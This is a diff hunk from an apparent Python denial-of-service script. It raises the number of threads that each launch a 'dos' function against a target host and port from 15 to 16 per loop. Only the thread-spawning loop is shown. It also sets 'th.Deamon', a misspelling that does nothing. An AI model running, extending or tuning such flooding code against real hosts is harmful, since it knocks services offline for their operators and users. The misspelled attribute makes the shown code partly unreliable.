@@ -89,7 +89,7 @@ if __name__ == "__main__":
         print("\n")
         try:
             while True:
-                for x in range(15):
+                for x in range(16):
                     ak = ak +1
                     th=threading.Thread(target=dos,args=(host,port,ak),name="User-"+str(1))
                     th.Deamon=True
